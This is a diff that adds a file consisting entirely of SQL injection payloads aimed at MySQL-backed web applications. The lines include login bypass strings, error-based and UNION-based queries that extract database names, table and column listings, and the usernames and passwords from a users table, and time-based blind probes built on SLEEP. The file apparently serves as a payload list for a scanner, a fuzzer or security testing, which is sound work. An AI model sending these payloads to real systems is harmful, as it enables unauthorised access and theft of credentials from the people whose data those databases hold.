@@ -1,0 +1,25 @@
+' OR 1=1 --
+' OR 1=2 --
+' AND 1=1 --
+' AND 1=2 --
+admin' AND 1=1 --
+admin' AND 1=2 --
+' OR 1=1; --
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a6f6e7a,(SELECT DATABASE()),0x3a6f6e7a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a); --
+1' AND extractvalue(1,concat(0x5c,(select database()))) --
+1' UNION ALL SELECT NULL, NULL, @@version --
+1' UNION ALL SELECT NULL, table_name FROM information_schema.tables --
+1' UNION ALL SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --
+' OR IF(1=1, SLEEP(5), 0) --
+' AND IF(1=2, SLEEP(5), 0) --
+1' AND IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), 0) --
+1' UNION SELECT 1,2,3 --
+1' UNION SELECT NULL, username, password FROM users --
+1' UNION SELECT NULL, NULL, table_name FROM information_schema.tables WHERE table_schema=database() --
+' OR '1'='1' --
+' OR 'a'='a' /*
+admin' --
+admin'/*
+admin' OR '1'='1'--
+1' AND (SELECT COUNT(*) FROM users); --
+1' AND (SELECT SLEEP(5)); --
